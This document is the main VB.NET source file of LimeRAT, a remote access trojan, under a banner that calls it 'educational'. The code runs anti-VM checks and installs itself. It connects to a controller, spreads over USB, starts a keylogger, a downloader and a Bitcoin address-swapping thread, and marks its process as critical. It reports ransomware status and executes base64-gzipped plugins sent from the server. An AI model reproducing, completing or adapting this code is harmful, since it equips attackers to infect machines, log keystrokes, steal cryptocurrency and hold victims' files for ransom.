'##################################################################
'##         N Y A N   C A T  |||   Updated on Aug/19/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                           .. LimeRAT ..                      ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##            https://github.com/NYAN-x-CAT/Lime-RAT            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################

Namespace Lime

    Public Class C_Main
        Public Shared C As New C_Socket
        Public Shared SPL = C_Settings.SPL

        Public Shared Sub Main()

            Try

                'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
                'Thread.Sleep(35000) '[New client infected]
                'End If

                Dim num As Integer = C_Settings.Delay
                Do Until num = 0
                    Threading.Thread.Sleep(1000)
                    num -= 1
                Loop

                Dim createdNew As Boolean
                Dim mutex As Threading.Mutex = New Threading.Mutex(True, C_Settings.MTX, createdNew)
                Try
                    If Not createdNew Then End
                Finally
                    If createdNew Then
                        mutex.ReleaseMutex()
                    End If
                End Try

                If C_Settings.ANTI Then
                    C_AntiVM.Check()
                End If

                Call C_Installation.INS()

                C_Socket.T1.Start()

                If C_Settings.USB Then
                    Dim _USB As Threading.Thread = New Threading.Thread(AddressOf StartSP)
                    _USB.Start()
                End If

                If C_Settings.PIN Then
                    Dim _PIN As Threading.Thread = New Threading.Thread(AddressOf StartPIN)
                    _PIN.Start()
                End If

                Dim _KLG As Threading.Thread = New Threading.Thread(AddressOf StartKLG)
                _KLG.Start()

                Dim CHK As Threading.Thread = New Threading.Thread(AddressOf Checking)
                CHK.Start()

                Dim DW As Threading.Thread = New Threading.Thread(AddressOf C_Downloader.Downloader)
                DW.Start()

                If C_Settings.BTC_ADDR.Length > 25 Then
                    Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf C_BTC._BTC_ST)
                    _BTC.SetApartmentState(Threading.ApartmentState.STA)
                    _BTC.Start()
                End If

                C_CriticalProcesses.CriticalProcesses_Enable()

                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf Handler_SessionEnding

            Catch : End Try


        End Sub

#Region "Plugins Loops"

        Private Shared Sub Checking()
            Threading.Thread.CurrentThread.Sleep(5000)
            Dim Old As String = GTV("Rans-Status")
            Dim Old2 As String = GTV("USB")


            While True
                Try
1:
                    If C.CNT = True Then
                        Threading.Thread.CurrentThread.Sleep(3000)
                        'Compare old string with new string            
                        If Old <> GTV("Rans-Status").ToString Then
                            Old = GTV("Rans-Status")
                            C.Send("!R" & SPL & GTV("Rans-Status").ToString)
                        End If

                        If C_Settings.USB Then
                            If Old2 <> GTV("USB").ToString Then
                                Old2 = GTV("USB")
                                C.Send("!SP" & SPL & GTV("USB").ToString)
                            End If
                        End If
                    Else
                        Threading.Thread.CurrentThread.Sleep(5000)
                    End If
                Catch ex As Exception
                    GoTo 1
                End Try
            End While

        End Sub

        Private Shared Sub StartSP()
            Try
                If GTV("_USB") = Nothing Then
                    While True
                        If C.CNT = True Then
                            Threading.Thread.CurrentThread.Sleep(9000)
                            C.Send("PLUSB")
                            Exit While
                        End If
                    End While

                Else
                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_USB")), False))
                End If
            Catch ex As Exception
                C.Send("MSG" + SPL + "_USB Error! " + ex.Message)
            End Try
        End Sub

        Private Shared Sub StartPIN()
            Try
                If GTV("_PIN") = Nothing Then
                    While True
                        If C.CNT = True Then
                            Threading.Thread.CurrentThread.Sleep(11000)
                            C.Send("PLPIN")
                            Exit While
                        End If
                    End While

                Else
                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_PIN")), False))
                End If
            Catch ex As Exception
                C.Send("MSG" + SPL + "_PIN Error! " + ex.Message)
            End Try
        End Sub

        Private Shared Sub StartKLG()
            Try
                If GTV("_KLG") = Nothing Then
                    While True
                        If C.CNT = True Then
                            Threading.Thread.CurrentThread.Sleep(11000)
                            C.Send("PLKLG")
                            Exit While
                        End If
                    End While

                Else
                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_KLG")), False))
                End If
            Catch ex As Exception
                C.Send("MSG" + SPL + "_KLG Error! " + ex.Message)
            End Try
        End Sub

#End Region

    End Class

End Namespace